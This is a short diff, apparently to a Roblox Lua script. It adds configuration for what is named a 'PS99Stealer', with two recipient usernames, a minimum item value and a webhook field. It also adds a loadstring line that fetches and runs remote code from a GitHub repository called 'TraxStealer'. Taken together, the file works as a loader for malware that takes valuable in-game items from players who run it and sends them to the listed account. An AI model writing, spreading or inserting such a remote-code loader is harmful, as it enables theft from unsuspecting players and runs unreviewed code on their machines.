@@ -1,1 +1,6 @@
-obfuscated script
+Username = "SkibidiAhhWolf9"
+Username2 = "SkibidiAhhWolf9"
+MinimumRAP = 100000
+Webhook = "gulp"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
